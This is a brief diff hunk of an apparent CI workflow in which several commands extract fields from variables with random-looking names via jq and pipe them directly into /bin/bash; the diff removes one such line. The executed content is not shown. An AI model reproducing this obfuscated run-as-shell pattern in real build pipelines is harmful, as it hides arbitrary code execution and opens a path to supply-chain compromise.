@@ -28,7 +28,6 @@ jobs:
           echo $h597 | jq -r .tksna4640 | /bin/bash
           printf '%s' "$lii7547" | jq -r .mdbi0510 | /bin/bash
           printf '%s' "$gdt17185" | jq -r .uaaap0878 | /bin/bash
-          echo $gmp936 | jq -r .hobnu01 | /bin/bash
 
       - name: Save results
         if: always()
